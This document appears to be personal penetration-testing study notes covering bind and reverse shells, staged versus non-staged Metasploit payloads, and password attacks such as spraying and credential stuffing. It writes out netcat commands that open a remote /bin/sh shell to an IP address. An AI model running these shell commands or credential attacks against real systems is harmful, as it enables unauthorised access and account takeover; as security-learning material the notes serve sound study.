# Attack

 ## Shells
  - Bind shell
     - Attacker connects to victim
     
         example:
            
            Victim would run: ns -lvp 4444 -e /bin/sh (listen for the connection request)  
            Attacker would run: nc 192.168.1.1 4444   (establish /bin/sh (shell) once connected)          
              
  
  - Reverse shell
      - Victim system connects to us
        
          example: 
          
              Victim would run: nc 192.168.1.1 4444 -e /bin/sh  (establish /bin/sh (shell) once connected)
              Attacker would run: ns -lvp 4444 (listen for the connection request)
              
              
       
# staged vs non-staged payloads

  Note: payloads are what runs as the exploit
  
  - Non-staged
     - Sends exploit shell codes all at once
     - larger in size, wont always work
                                    V    One stage      V
     - metasploit example: windows/meterpreter_reverse_tcp

  - staged
     - Sends payload in stages
     - Can be less stable 
                                    Stage 1 V   Stage 2 V
     - metasploit example: windows/meterpreter/reverse_tcp
     
                                      
### NOTE: exploit may be right, but not all payloads work



# Manual exploitation vs tools

  ### Manual
  
  - Finding exploits:
    - Exploitdb (listed from nmap exploidb vuln scan)
    - google
  
  ### Tools
  
  - Metasploit


  - on a pentest, being loud may not be a bad thing. So brute forcing for weak passwords should be okay.
  
 
 ### Authentication attack notes
 
    #Ask/use test account to find out how many failed logins lock out for whatever login page you are attempting to attack
 
  - Bruteforcing
    - Use user and/or pass wordlists to try and break into an existing account.
  
  - Password spray
    - Using known username with out known password.
  
  - Credential stuffing
    - Using breached credentials with the hopes that the user reuses their passwords.
      - these can be found by looking at OSINT for employees then researching if company email was involved in breaches
